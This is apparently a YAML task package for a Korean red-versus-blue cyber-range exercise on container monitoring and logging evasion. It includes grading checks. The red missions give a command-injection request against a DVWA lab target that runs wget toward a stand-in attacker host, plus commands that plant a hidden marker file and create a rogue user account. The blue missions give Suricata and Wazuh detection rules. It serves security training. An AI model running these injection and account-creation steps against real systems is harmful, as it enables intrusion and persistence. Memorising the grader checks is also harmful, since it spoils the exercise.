id: "cloud-container-w12"
category: "cloud-container"
title: "[클라우드/컨테이너 W12] 컨테이너 모니터링/로깅 — 로그 회피 vs 가시성 통제"
difficulty: "medium"
time_limit: 2700
battle_type: "1v1"
description: |
  클라우드/컨테이너 12주차 — **컨테이너 모니터링/로깅**. 런타임 행위 가시성·로그 수집을 점검한다. 공격자는
  로깅을 회피하고, 점검자(너)는 런타임 모니터링(Falco류)·로그 수집을 점검·구현한다.

  ▸ 이야기: 공격자가 로깅을 회피해(태그 `cc12r1`) 회피 흔적(`/tmp/.cc12monitor`)과 계정 `cca12` 를 남긴다.
    점검자는 ① 회피 탐지, ② 런타임 모니터링 Wazuh 룰, ③ 가시성 점검·R/B/P 로 대응한다.

  ▸ 모드: solo/duel. 공격자=외부 공격자 VM(192.168.0.202)(192.168.0.202), Red 채점=대상 흔적(WAF audit 태그/회피 파일·계정).
  ▸ 마커: 태그 **`cc12r1-<본인id>`**, 회피 흔적 **`/tmp/.cc12monitor`**(마커 `cc12`), 계정 **`cca12`**,
    Suricata **sid 9012011**, Wazuh **id 106121**. 종료 시 cleanup.

red_missions:
  - order: 1
    assess_target: opponent
    target_vm: web
    points: 20
    instruction: |
      ## 🎯 RED-1 [런타임 이상 행위] — 컨테이너 내 의심 실행

      ### 할 일 (외부 공격자 VM 192.168.0.202)
      ```bash
      curl -s -A "cc12r1-kim" -H "Host: dvwa.el34.lab" \
        "http://192.168.0.161/vulnerabilities/exec/?ip=127.0.0.1;wget%20http://atk/x%23cc12r1-kim&Submit=Submit"
      ```
      ### 채점 방법 / 합격 기준
      대상 WAF audit 에 태그 `cc12r1` 흔적 시 인정.
    hint: "태그(cc12r1) 컨테이너 내 의심 실행(wget) → 대상 modsec audit. 채점: log_contains modsec cc12r1."
    verify:
      type: "log_contains"
      expect: "cc12r1"
      checks:
        - { id: "red-1-1", type: "log_contains", target: "web",
            params: { log: "modsec", pattern: "cc12r1", since_sec: 1800 } }
      semantic:
        intent: "런타임 이상 행위(T1059) — 컨테이너 내 의심 실행. 모니터링 표적. 태그(cc12r1) 귀속."
        success_criteria: ["대상 WAF audit 에 cc12r1 태그", "런타임 이상 행위 서술"]
        acceptable_methods: ["외부 공격자 VM(192.168.0.202) 에서 태그 단 의심 실행"]
        negative_signs: ["태그 누락 / 대상 미도달"]

  - order: 2
    assess_target: opponent
    target_vm: web
    points: 15
    instruction: |
      ## 🎯 RED-2 [로깅 회피] — 모니터링 사각 흔적 + 계정

      ### 할 일
      ```bash
      printf 'cc12 logging evasion: stdout suppressed, log driver bypass, action unlogged' > /tmp/.cc12monitor
      sudo useradd -m -s /bin/bash cca12
      ```
      ### 채점 방법 / 합격 기준
      `/tmp/.cc12monitor`(마커 `cc12`) 또는 `cca12` 존재 시 인정.
    hint: "로깅 회피 /tmp/.cc12monitor (마커 cc12) + useradd cca12. 채점: file_contains monitor cc12 + file_contains passwd cca12."
    verify:
      type: "file_contains"
      expect: "cc12"
      checks:
        - { id: "red-2-1", type: "file_contains", target: "web",
            params: { path: "/tmp/.cc12monitor", pattern: "cc12" } }
        - { id: "red-2-2", type: "file_contains", target: "web",
            params: { path: "/etc/passwd", pattern: "cca12" } }
      semantic:
        intent: "로깅 회피(T1562.006) + 계정(T1136) — 모니터링 사각."
        success_criteria: ["/tmp/.cc12monitor(마커 cc12) 또는 계정 cca12", "로깅 회피 방식 서술"]
        acceptable_methods: ["회피 흔적 + useradd"]
        negative_signs: ["흔적 미생성"]

blue_missions:
  - order: 1
    assess_target: self
    target_vm: ips
    points: 22
    instruction: |
      ## 🛡️ BLUE-1 [런타임 이상 탐지] — Suricata 룰 (sid 9012011)

      ### 할 일
      ```
      alert http any any -> any any (msg:"CLOUD-W12 container runtime anomaly (wget/download)"; flow:to_server; http.uri; content:"wget"; nocase; sid:9012011; rev:1;)
      ```
      ```bash
      sudo suricatasc -c reload-rules
      ```
      ### 채점 방법 / 합격 기준
      ips 의 `local.rules` 에 sid 9012011 룰 존재 시 인정.
    hint: "런타임 이상 Suricata 룰(sid 9012011) → reload. 채점: file_contains local.rules 9012011."
    verify:
      type: "file_contains"
      expect: "9012011"
      checks:
        - { id: "blue-1-1", type: "file_contains", target: "ips",
            params: { path: "/etc/suricata/rules/local.rules", pattern: "9012011" } }
      semantic:
        intent: "컨테이너 모니터링 — 런타임 이상 Suricata 룰."
        success_criteria: ["local.rules 에 sid 9012011", "런타임 이상 탐지 의의"]
        acceptable_methods: ["Suricata 룰 작성 + reload"]
        negative_signs: ["패턴 부정확 / 문법 오류"]

  - order: 2
    assess_target: self
    target_vm: siem
    points: 20
    instruction: |
      ## 🛡️ BLUE-2 [로깅 회피 탐지] — Wazuh 룰 (id 106121)

      ### 할 일
      ```xml
      <group name="edu,monitoring,">
        <rule id="106121" level="12">
          <if_group>edu</if_group>
          <match>cca12</match>
          <description>CLOUD-W12 - container logging evasion / runtime anomaly / account</description>
        </rule>
      </group>
      ```
      ```bash
      sudo /var/ossec/bin/wazuh-control restart
      ```
      ### 채점 방법 / 합격 기준
      `local_rules.xml` 에 id 106121 룰 존재 시 인정.
    hint: "로깅 회피 Wazuh 룰(id 106121) → restart. 채점: file_contains local_rules.xml 106121."
    verify:
      type: "file_contains"
      expect: "106121"
      checks:
        - { id: "blue-2-1", type: "file_contains", target: "siem",
            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "106121" } }
      semantic:
        intent: "컨테이너 모니터링 — 로깅 회피/계정 Wazuh 룰. 런타임 가시성(Falco류)."
        success_criteria: ["local_rules.xml 에 rule id 106121", "로깅 회피 탐지 로직"]
        acceptable_methods: ["Wazuh 룰 작성 + restart"]
        negative_signs: ["탐지 로직 부실 / XML 오류"]

  - order: 3
    assess_target: self
    target_vm: siem
    points: 18
    instruction: |
      ## 🛡️ BLUE-3 [가시성 점검·R/B/P]

      ### 할 일
      보고서에:
      - 모니터링 점검(런타임 보안(Falco)/로그 드라이버/중앙 집계/syscall 감사/이상 탐지 베이스라인) + 위험도 + 권고
      - R/B/P 회고 + 회피 흔적(`/tmp/.cc12monitor`)·계정(cca12) 헌팅
      ```bash
      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
      ```
      ### 채점 방법 / 합격 기준
      본인 SIEM 에 최근 경보 + 제출한 가시성 점검·R/B/P 로 인정.
    hint: "모니터링 점검(Falco/로그 드라이버/중앙 집계/syscall 감사/베이스라인) + R/B/P + 회피/계정 헌팅. 채점: wazuh_alert + 제출."
    verify:
      type: "wazuh_alert"
      expect: "alert"
      checks:
        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
      semantic:
        intent: "컨테이너 가시성 점검 종합 — 런타임 모니터링/로그 집계 + R/B/P. 분석형 — 구체 점검/권고 제시 시 점수 상승."
        success_criteria:
          - "최근 경보 수집 확인"
          - "모니터링 점검(Falco/로그 드라이버/집계/syscall) + 권고"
          - "R/B/P 회고 + 회피/계정 헌팅"
        acceptable_methods: ["점검 표 + 권고 + 회고 + 헌팅"]
        negative_signs: ["권고/회고 누락"]
